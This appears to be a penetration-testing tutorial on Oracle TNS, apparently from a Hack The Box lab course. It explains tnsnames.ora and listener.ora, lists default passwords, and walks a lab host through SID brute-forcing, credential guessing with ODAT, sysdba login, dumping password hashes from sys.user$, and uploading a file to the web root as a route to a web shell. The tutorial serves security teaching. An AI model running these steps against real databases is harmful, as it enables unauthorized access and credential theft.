The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.

Over time, TNS has been updated to support newer technologies, including `IPv6` and `SSL/TLS` encryption which makes it more suitable for the following purposes:

| | | | |
| --- | --- | --- | --- |
| Name resolution | Connection management | Load balancing | Security |

Furthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.

## Default Configuration

- Default config varies depending on the Oracle **version and edition** installed, but some settings are common by default.
- Listener listens for incoming connections on **TCP/1521** by default — can be changed during install or later in the config file.
- TNS listener supports various network protocols: **TCP/IP, UDP, IPX/SPX, and AppleTalk**.
- Can support multiple network interfaces — listen on **specific IP addresses or all available interfaces**.
- Oracle TNS can be **remotely managed in Oracle 8i/9i, but not in Oracle 10g/11g** by default.
- Default config includes a few basic security features:
  - Listener only accepts connections from **authorized hosts**.
  - Performs basic authentication using a combination of **hostnames, IP addresses, and usernames/passwords**.
  - Uses **Oracle Net Services** to encrypt communication between client and server.
- Config files are **`tnsnames.ora`** and **`listener.ora`**, typically located in **`$ORACLE_HOME/network/admin`**.
- These plain-text files contain configuration info for Oracle database instances and other network services using the TNS protocol.
- Oracle TNS is often used with other Oracle services: **Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers**, and many more.
- Many changes have been made to default installations of Oracle services:
  - **Oracle 9** has a default password: **`CHANGE_ON_INSTALL`**.
  - **Oracle 10** has **no default password** set.
  - The **Oracle DBSNMP** service uses a default password: **`dbsnmp`** — worth remembering when you come across it.
- Many organizations still use the **finger service** together with Oracle, which can put Oracle's service at risk and make it vulnerable when you have the required knowledge of a **home directory**.

Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm) file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple `tnsnames.ora` file might look like this:

### Tnsnames.ora

```
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Here we can see a service called `ORCL`, which is listening on port `TCP/1521` on the IP address `10.129.11.102`. Clients should use the service name `orcl` when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.

On the other hand, the `listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.

### Listener.ora

```
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

In short, the client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.

Oracle databases can be protected by using a so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. It serves as a blacklist that cannot be accessed through the Oracle Application Server.

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`LOG_FILE`|The file where the log information is stored.|

## Enumeration & Footprinting

Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our `Pwnbox` instance in case it does not have these already. Here is a list of commands that does all of that:

### Setting up - ODAT

```shell
aymane0x90@htb[/htb]$ sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0
python3 setup.py build
sudo python3 setup.py install
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
pip3 install openpyxl

<SNIP>
```

Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws, including SQL injection, remote code execution, and privilege escalation.

Let's now use `nmap` to scan the default Oracle TNS listener port.

### Nmap

```shell
aymane0x90@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. When a client connects to an Oracle database, it specifies the database's `SID` along with its connection string. If the client specifies an incorrect SID, the connection attempt will fail. If the client does not specify a SID, the default value defined in the `tnsnames.ora` file is used.

There are various ways to enumerate, or better said, guess SIDs. We can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.

### Nmap - SID Bruteforcing 

```shell
aymane0x90@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.

### ODAT

```shell
aymane0x90@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

<SNIP>

[!] Notice: 'mdsys' account is locked, so skipping this username for password
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
[!] Notice: 'outln' account is locked, so skipping this username for password
[+] Valid credentials found: scott/tiger. Continue...

<SNIP>
```

In this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.

Before we can use `sqlplus` on our `Pwnbox`, we need to update and upgrade `parrot-core` and install the `oracle-instantclient-sqlplus` package.

### Setting up - SQLplus

```shell
aymane0x90@htb[/htb]$ sudo apt update
sudo apt upgrade parrot-core
sudo apt update
sudo apt install oracle-instantclient-sqlplus
```

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below.

```shell
aymane0x90@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Finally, we can execute `sqlplus -v` to check if the tool will be executed without errors.

```shell
aymane0x90@htb[/htb]$ sqlplus -v

SQL*Plus: Release 19.0.0.0.0 - Production
Version 19.6.0.0.0
```

### SQLplus - Log In

```shell
aymane0x90@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 19.0.0.0.0 - Production
Version 19.6.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

There are many SQLplus commands that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:

### Oracle RDBMS - Interaction

```shell
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
HELP

<SNIP>


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.

### Oracle RDBMS - Database Enumeration

```shell
aymane0x90@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO

<SNIP>
```

We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. From this point, we could retrieve the password hashes from the `sys.user$` and try to crack them offline. The query for this would look like the following:

### Oracle RDBMS - Extract Password Hashes

```shell
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
OUTLN                          4A3BA55E08595C81

<SNIP>
```

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. If we know what type of system we are dealing with, we can try the default paths, which are:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

### Oracle RDBMS - File Upload

```shell
aymane0x90@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
aymane0x90@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finally, we can test if the file upload approach worked with `curl`. We will use a `GET http://<IP>` request, or we can visit via browser.

```shell
aymane0x90@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```
